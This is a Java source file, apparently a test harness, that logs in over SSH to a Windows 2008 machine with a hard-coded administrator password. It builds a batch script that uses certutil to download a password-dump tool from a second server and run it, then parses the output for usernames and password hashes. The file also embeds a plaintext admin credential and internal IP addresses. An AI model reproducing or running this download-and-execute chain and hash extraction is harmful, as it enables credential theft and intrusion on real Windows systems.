package ssh;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TestWindows2008Main {
    public static void main(String[] args) {

        String user = "administrator";
        String password = "wuqi5678";
        String host = "10.167.77.43";
        int port = 30022;
        ShellUtil su = new ShellUtil();
        try {
            try {
                su.connect(host,port,user,password);
                String com1 = "mkdir c:\\rkl";
                String result1 = su.command(com1 + "\r");
                String com2 = "mkdir c:\\rkl\\PwDump";
                String result2 = su.command(com2 + "\r");
                String com3 = "cd c:\\rkl";
                String result3 = su.command(com3 + "\r");
                String com4 = "echo ^@echo off>c:\\rkl\\Downloader.bat";
                String result4 = su.command(com4 + "\r");
                String com5 = "echo set WinPwDumpFile=c:\\rkl\\PwDump\\WinPwDump.bat>>c:\\rkl\\Downloader.bat";
                String result5 = su.command(com5 + "\r");
                String com6 = "echo set BlobBinFile=c:\\rkl\\Blob0_0.bin>>c:\\rkl\\Downloader.bat";
                String result6 = su.command(com6 + "\r");
                String com7 = "echo set QuarksPwDumpFile=c:\\rkl\\DownloadWinPwDump>>c:\\rkl\\Downloader.bat";
                String result7 = su.command(com7 + "\r");
                String com8 = "echo if exist ^%WinPwDumpFile^%  ^(echo ^\"download file success^\"^)else ^( call C:\\WINDOWS\\system32\\certutil.exe -urlcache -split -f http://^%^%1:^%^%2/v1/file/DownloadWinPwDump^>nul 2^>^&1^)>>c:\\rkl\\Downloader.bat";
                String result8 = su.command(com8 + "\r");
                String com9 = "echo if ^%errorlevel^% ^=^= 0 ^(echo success ^>nul^) else ^(echo download quarksPwdump.exe  faile %errorlevel^%^&goto END^)>>c:\\rkl\\Downloader.bat";
                String result9 = su.command(com9 + "\r");
                String com10 = "echo if exist ^%BlobBinFile^% ^(if exist ^%WinPwDumpFile^% ^(echo ^\"c:\\rkl\\PwDump\\WinPwDump.bat file is exist^\"^)else ^(call copy c:\\rkl\\Blob0_0.bin c:\\rkl\\PwDump\\WinPwDump.bat^)^)>>c:\\rkl\\Downloader.bat";
                String result10 = su.command(com10 + "\r");
                String com11 = "echo if exist ^%QuarksPwDumpFile^% ^(if exist ^%WinPwDumpFile^% ^(echo ^\"c:\\rkl\\PwDump\\WinPwDump.bat file is exist^\"^)else ^(call copy c:\\rkl\\DownloadWinPwDump c:\\rkl\\PwDump\\WinPwDump.bat^)^)>>c:\\rkl\\Downloader.bat";
                String result11 = su.command(com11 + "\r");
                String com12 = "echo ^:END>>c:\\rkl\\Downloader.bat";
                String result12 = su.command(com12 + "\r");
                String com13 = "Downloader.bat 10.166.8.70 28080";
                String result13 = su.command(com13 + "\r");
                String com14 = "cd c:\\rkl\\PwDump";
                String result14 = su.command(com14 + "\r");
                String com15 = "WinPwDump.bat 10.166.8.70 28080";
                String result = su.command(com15 + "\r");
                System.out.println("----------------------");
                System.out.println(result);
                System.out.println("----------------------");

                result = result.replaceAll("\n", "");
                result = result.replaceAll("\r", "");
                result = result.replaceAll("\\[24;1H", "");
                Pattern pattern = Pattern.compile("HASH=.*");
                Matcher matcher = pattern.matcher(result);
                if (matcher.find()) {
                    result = matcher.group().toString();
//                    result = result.replaceAll("HASH=","");
                    int indexof = result.lastIndexOf(";");
                    result = result.substring(0,indexof-1);
                    result = result.trim();
                    result = result.replaceAll("\\s+", "").toString();
                    String[] users = result.split("HASH=");
                    if (users != null) {
                        for (int i = 0; i < users.length; i++) {
                            String usersstr = users[i];
                            System.out.println("#" + usersstr);
                            if (!"".equals(usersstr) && usersstr != null) {
                                String[] userpass = usersstr.split(",");
                                System.out.println("username:" + userpass[0]);
                                System.out.println("password:" + userpass[3]);
                            }
                        }
                    }
                }
            } catch (Exception e) {
                System.err.println("采集异常");
                System.err.println(e);
            } finally {
                su.disconnect();
            }
        } catch (Exception e) {
            System.err.println("关闭采集连接异常");
            System.err.println(e);
        }
    }
}
